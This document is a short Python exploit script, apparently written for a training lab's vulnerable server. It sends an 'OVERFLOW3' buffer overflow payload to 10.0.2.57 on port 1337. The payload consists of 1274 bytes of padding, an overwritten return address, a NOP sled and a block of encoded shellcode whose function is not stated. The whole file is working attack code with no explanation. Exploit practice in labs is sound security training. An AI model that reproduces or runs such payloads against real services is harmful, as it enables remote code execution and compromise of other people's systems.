import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW3 '
buffer += b'A' * 1274
retn = b'\x03\x12\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xbe\xe6\x99\x20\x1f\xda\xc9\xd9\x74\x24\xf4"
shellcode += b"\x58\x29\xc9\xb1\x31\x31\x70\x13\x83\xe8\xfc"
shellcode += b"\x03\x70\xe9\x7b\xd5\xe3\x1d\xf9\x16\x1c\xdd"
shellcode += b"\x9e\x9f\xf9\xec\x9e\xc4\x8a\x5e\x2f\x8e\xdf"
shellcode += b"\x52\xc4\xc2\xcb\xe1\xa8\xca\xfc\x42\x06\x2d"
shellcode += b"\x32\x53\x3b\x0d\x55\xd7\x46\x42\xb5\xe6\x88"
shellcode += b"\x97\xb4\x2f\xf4\x5a\xe4\xf8\x72\xc8\x19\x8d"
shellcode += b"\xcf\xd1\x92\xdd\xde\x51\x46\x95\xe1\x70\xd9"
shellcode += b"\xae\xbb\x52\xdb\x63\xb0\xda\xc3\x60\xfd\x95"
shellcode += b"\x78\x52\x89\x27\xa9\xab\x72\x8b\x94\x04\x81"
shellcode += b"\xd5\xd1\xa2\x7a\xa0\x2b\xd1\x07\xb3\xef\xa8"
shellcode += b"\xd3\x36\xf4\x0a\x97\xe1\xd0\xab\x74\x77\x92"
shellcode += b"\xa7\x31\xf3\xfc\xab\xc4\xd0\x76\xd7\x4d\xd7"
shellcode += b"\x58\x5e\x15\xfc\x7c\x3b\xcd\x9d\x25\xe1\xa0"
shellcode += b"\xa2\x36\x4a\x1c\x07\x3c\x66\x49\x3a\x1f\xec"
shellcode += b"\x8c\xc8\x25\x42\x8e\xd2\x25\xf2\xe7\xe3\xae"
shellcode += b"\x9d\x70\xfc\x64\xda\x9f\x1e\xad\x16\x08\x87"
shellcode += b"\x24\x9b\x55\x38\x93\xdf\x63\xbb\x16\x9f\x97"
shellcode += b"\xa3\x52\x9a\xdc\x63\x8e\xd6\x4d\x06\xb0\x45"
shellcode += b"\x6d\x03\xd3\x08\xfd\xcf\x3a\xaf\x85\x6a\x43"


payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
